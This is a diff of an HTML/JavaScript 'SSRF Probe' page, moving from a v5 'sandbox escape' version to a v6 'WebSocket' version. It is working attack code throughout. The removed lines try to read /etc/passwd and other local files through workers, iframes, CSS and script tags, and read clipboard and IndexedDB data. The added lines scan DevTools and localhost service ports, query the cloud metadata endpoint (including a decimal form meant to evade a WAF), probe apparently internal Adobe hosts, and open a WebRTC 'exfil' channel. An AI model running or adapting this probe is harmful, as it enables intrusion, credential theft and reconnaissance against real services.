@@ -1,163 +1,139 @@
 <html><body>
-<h2>SSRF Probe v5 - Sandbox Escape</h2>
+<h2>SSRF Probe v6 - WebSocket</h2>
 <pre id="r"></pre>
 <script>
 var R=document.getElementById('r');
 function L(s){R.textContent+=s+'\n';}
+L('UA: '+navigator.userAgent);
+L('Cores: '+navigator.hardwareConcurrency);
 
-L('Origin: '+location.origin);
-L('Proto: '+location.protocol);
-
-// 1. Worker importScripts - different from XHR, might bypass
-L('\n== Worker importScripts ==');
-var w1code = '\
-var files=["file:///etc/passwd","file:///etc/hostname","file:///proc/self/cgroup"];\
-var results=[];\
-for(var i=0;i<files.length;i++){\
-  try{\
-    importScripts(files[i]);\
-    results.push({f:files[i],s:"IMPORTED"});\
-  }catch(e){\
-    results.push({f:files[i],e:e.constructor.name+": "+e.message});\
-  }\
-}\
-self.postMessage(results);';
-
-var w1done=false;
-try{
-  var b1=new Blob([w1code],{type:'text/javascript'});
-  var w1=new Worker(URL.createObjectURL(b1));
-  w1.onmessage=function(e){w1done=true;e.data.forEach(function(r){L(r.f+': '+(r.s||r.e));});};
-  w1.onerror=function(e){w1done=true;L('W1 err: '+e.message);};
-  L('Worker importScripts started');
-}catch(e){w1done=true;L('W1 create: '+e.message);}
-
-// 2. Worker with data: URI scheme
-L('\n== Worker data: URI ==');
-var w2code='self.postMessage("data-worker-alive");try{var x=new XMLHttpRequest();x.open("GET","file:///etc/passwd",false);x.send();self.postMessage("FILE:"+x.responseText.substring(0,500));}catch(e){self.postMessage("ERR:"+e.message);}';
-var w2done=false;
-try{
-  var w2=new Worker('data:text/javascript,'+encodeURIComponent(w2code));
-  w2.onmessage=function(e){w2done=true;L('data-Worker: '+e.data);};
-  w2.onerror=function(e){w2done=true;L('data-Worker err: '+e.message);};
-  L('data: Worker started');
-}catch(e){w2done=true;L('data: Worker create: '+e.message);}
-
-// 3. Try various Chrome internal protocols
-L('\n== Protocol Probes ==');
-var protocols=['chrome://version','chrome://settings','chrome://flags',
-  'chrome://gpu','chrome://net-internals','chrome://inspect',
-  'devtools://devtools/bundled/inspector.html',
-  'view-source:file:///etc/passwd',
-  'chrome-extension://invalid/manifest.json'];
-for(var i=0;i<protocols.length;i++){
-  var p=protocols[i];
-  try{
-    var x=new XMLHttpRequest();
-    x.open('GET',p,false);
-    x.send();
-    L(p+': s='+x.status+' len='+x.responseText.length);
-  }catch(e){L(p+': '+e.message);}
+// WebSocket probe with timeout and data capture
+function wsProbe(url,label,timeout){
+  timeout=timeout||3000;
+  return new Promise(function(ok){
+    var t=Date.now();
+    var msgs=[];
+    var done=false;
+    function fin(s){if(!done){done=true;var dt=Date.now()-t;L(label+': '+s+' '+dt+'ms');if(msgs.length)msgs.forEach(function(m){L('  MSG: '+m.substring(0,300));});ok();}}
+    try{
+      var ws=new WebSocket(url);
+      ws.onopen=function(){
+        L(label+': OPEN '+(Date.now()-t)+'ms');
+        // Try sending data
+        try{ws.send('{"id":1,"method":"Browser.getVersion"}');}catch(e){}
+        try{ws.send('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n');}catch(e){}
+      };
+      ws.onmessage=function(e){
+        var d=typeof e.data==='string'?e.data:'[binary '+e.data.size+'B]';
+        msgs.push(d);
+        L(label+' MSG: '+d.substring(0,300));
+      };
+      ws.onerror=function(){fin('ERR');};
+      ws.onclose=function(e){fin('CLOSE code='+e.code+' reason="'+e.reason+'"');};
+      setTimeout(function(){if(!done){try{ws.close();}catch(e){}fin('TIMEOUT');}},timeout);
+    }catch(e){fin('CATCH: '+e.message);}
+  });
 }
 
-// 4. iframe file:// (read via contentDocument)
-L('\n== iframe file:// ==');
-var ifr=document.createElement('iframe');
-ifr.style.display='none';
-ifr.src='file:///etc/passwd';
-document.body.appendChild(ifr);
-ifr.onload=function(){
-  try{L('iframe loaded, doc: '+ifr.contentDocument?.body?.textContent?.substring(0,200));}
-  catch(e){L('iframe cross-origin: '+e.message);}
-};
-ifr.onerror=function(){L('iframe error');};
-
-// 5. object/embed with file://
-L('\n== object/embed ==');
-var obj=document.createElement('object');
-obj.data='file:///etc/passwd';
-obj.type='text/plain';
-document.body.appendChild(obj);
-
-// 6. script src=file:// - might leak via error handler
-L('\n== script src=file:// ==');
-window.onerror=function(msg,url,line,col,err){
-  L('GlobalError: msg='+msg+' url='+url+' line='+line);
-  return true;
-};
-var scr=document.createElement('script');
-scr.src='file:///etc/hostname';
-scr.onerror=function(e){L('script file err: '+e.type);};
-scr.onload=function(){L('script file LOADED');};
-document.head.appendChild(scr);
-
-// 7. CSS @import / @font-face with file://
-L('\n== CSS file:// ==');
-var style=document.createElement('style');
-style.textContent='@import url("file:///etc/passwd"); @font-face{font-family:test;src:url("file:///etc/passwd");}';
-document.head.appendChild(style);
-try{
-  var sheets=document.styleSheets;
-  for(var i=0;i<sheets.length;i++){
-    try{var rules=sheets[i].cssRules;L('Sheet '+i+': '+rules.length+' rules');}
-    catch(e){L('Sheet '+i+': '+e.message);}
+(async function(){
+  // 1. Chrome DevTools Protocol - various ports
+  L('\n== CDP WebSocket ==');
+  // First get the debug endpoint list via fetch
+  L('Checking CDP endpoints...');
+  var cdpPorts=[9222,9229,9333,9515,9223,9224,9225];
+  for(var i=0;i<cdpPorts.length;i++){
+    var p=cdpPorts[i];
+    try{
+      var r=await fetch('http://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
+      var t=await r.text();
+      L('CDP:'+p+' version: '+t.substring(0,300));
+    }catch(e){
+      L('CDP:'+p+' fetch: '+e.name);
+    }
+    // Also try WSS
+    try{
+      var r2=await fetch('https://127.0.0.1:'+p+'/json/version',{signal:AbortSignal.timeout(1500)});
+      var t2=await r2.text();
+      L('CDP:'+p+' (wss) version: '+t2.substring(0,300));
+    }catch(e){}
   }
-}catch(e){L('CSS: '+e.message);}
 
-// 8. link tag with file://
-var link=document.createElement('link');
-link.rel='stylesheet';
-link.href='file:///etc/passwd';
-link.onerror=function(){L('link file err');};
-link.onload=function(){L('link file LOADED');};
-document.head.appendChild(link);
+  // 2. WebSocket to localhost various ports
+  L('\n== WS localhost ==');
+  await wsProbe('ws://127.0.0.1:9222/','ws-cdp-9222',2000);
+  await wsProbe('ws://127.0.0.1:9229/','ws-node-9229',2000);
+  await wsProbe('ws://127.0.0.1:80/','ws-lo-80',2000);
+  await wsProbe('ws://127.0.0.1:8080/','ws-lo-8080',2000);
+  await wsProbe('ws://127.0.0.1:3000/','ws-lo-3000',2000);
+  await wsProbe('ws://127.0.0.1:6379/','ws-redis',2000);
+  await wsProbe('ws://127.0.0.1:27017/','ws-mongo',2000);
 
-// 9. img with file:// (for binary files)
-var img=new Image();
-img.src='file:///etc/passwd';
-img.onload=function(){L('img file LOADED '+img.width+'x'+img.height);};
-img.onerror=function(){L('img file err');};
+  // 3. WSS (secure WebSocket) - might bypass HTTP proxy!
+  L('\n== WSS (secure) ==');
+  await wsProbe('wss://127.0.0.1:443/','wss-lo-443',2000);
+  await wsProbe('wss://127.0.0.1:8443/','wss-lo-8443',2000);
+  await wsProbe('wss://127.0.0.1:9222/','wss-cdp-9222',2000);
 
-// 10. audio/video with file://
-var aud=document.createElement('audio');
-aud.src='file:///etc/passwd';
-aud.onerror=function(){L('audio file err');};
-aud.onloadeddata=function(){L('audio file LOADED');};
+  // 4. WSS to internal Adobe services
+  L('\n== WSS Adobe Internal ==');
+  await wsProbe('wss://senseicore-ue1.adobe.io/','wss-sensei',2000);
+  await wsProbe('wss://dc-argus.adobe.io/','wss-argus',2000);
+  await wsProbe('wss://platform-cs-jpn3.adobe.io/','wss-platcs',2000);
+  await wsProbe('wss://dc-genai-content-platform-v2-jpn3.adobe.io/','wss-genai',2000);
+  await wsProbe('wss://dc-genai-autocomplete-an1.adobe.io/','wss-autocomplete',2000);
 
-// 11. navigator.clipboard (might have pre-existing data)
-L('\n== Clipboard ==');
-try{
-  navigator.clipboard.readText().then(function(t){L('Clipboard: '+t.substring(0,200));}).catch(function(e){L('Clipboard: '+e.message);});
-}catch(e){L('Clipboard: '+e.message);}
+  // 5. WS to IMDS (decimal to bypass WAF)
+  L('\n== WS IMDS ==');
+  await wsProbe('ws://2852039166/','ws-imds-dec',2000);
+  await wsProbe('ws://169.254.169.254/','ws-imds',2000);
+  await wsProbe('ws://169.254.170.2/','ws-ecs',2000);
 
-// 12. Try to access indexedDB databases
-L('\n== IndexedDB ==');
-try{
-  indexedDB.databases().then(function(dbs){L('IDB: '+dbs.length+' databases');dbs.forEach(function(d){L('  '+d.name+' v'+d.version);});}).catch(function(e){L('IDB: '+e.message);});
-}catch(e){L('IDB: '+e.message);}
+  // 6. WS to internal hostnames
+  L('\n== WS Internal ==');
+  await wsProbe('ws://kubernetes.default.svc/','ws-k8s',2000);
+  await wsProbe('ws://localhost:10250/','ws-kubelet',2000);
+  await wsProbe('ws://localhost:2379/','ws-etcd',2000);
 
-// 13. SharedArrayBuffer (Spectre prerequisite)
-L('\n== SharedArrayBuffer ==');
-try{var sab=new SharedArrayBuffer(1024);L('SAB: available ('+sab.byteLength+'B)');}catch(e){L('SAB: '+e.message);}
+  // 7. EventSource (SSE) - another protocol that might bypass
+  L('\n== EventSource ==');
+  try{
+    var es=new EventSource('http://169.254.169.254/latest/meta-data/');
+    es.onopen=function(){L('ES IMDS: OPEN');};
+    es.onerror=function(){L('ES IMDS: ERR');es.close();};
+    es.onmessage=function(e){L('ES IMDS MSG: '+e.data);};
+  }catch(e){L('ES IMDS: '+e.message);}
+  try{
+    var es2=new EventSource('http://2852039166/latest/meta-data/');
+    es2.onopen=function(){L('ES dec: OPEN');};
+    es2.onerror=function(){L('ES dec: ERR');es2.close();};
+    es2.onmessage=function(e){L('ES dec MSG: '+e.data);};
+  }catch(e){L('ES dec: '+e.message);}
 
-// 14. Performance observer for resource timing
-L('\n== ResourceTiming ==');
-try{
-  var entries=performance.getEntriesByType('resource');
-  L('Resources: '+entries.length);
-  entries.forEach(function(e){L('  '+e.name.substring(0,80)+' '+e.duration.toFixed(1)+'ms');});
-}catch(e){}
+  // 8. Try RTCDataChannel for data exfil
+  L('\n== DataChannel ==');
+  try{
+    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    var dc=pc.createDataChannel('exfil');
+    dc.onopen=function(){L('DC OPEN');dc.send('test');};
+    dc.onmessage=function(e){L('DC MSG: '+e.data);};
+    dc.onerror=function(e){L('DC ERR');};
+    var offer=await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    L('SDP: '+offer.sdp.substring(0,200));
+    // Extract IPs from SDP
+    var ips=offer.sdp.match(/c=IN IP[46] (\S+)/g);
+    if(ips)L('SDP IPs: '+JSON.stringify(ips));
+    // Extract candidates from SDP
+    var cands=offer.sdp.match(/a=candidate:.+/g);
+    if(cands)cands.forEach(function(c){L('SDP cand: '+c);});
+  }catch(e){L('DC err: '+e.message);}
 
-// Busy wait
-L('\nWaiting 10s...');
+  L('\n== DONE v6 ==');
+})();
+
+// Busy wait 8s
 var start=Date.now();
-while(Date.now()-start<10000){}
-L('Wait done. w1='+w1done+' w2='+w2done);
-
-// Check iframe after wait
-try{L('iframe doc: '+(ifr.contentDocument?.body?.textContent?.substring(0,200)||'null'));}
-catch(e){L('iframe post-wait: '+e.message);}
-
-L('\n== DONE v5 ==');
+while(Date.now()-start<8000){}
+L('Wait done');
 </script>
 </body></html>
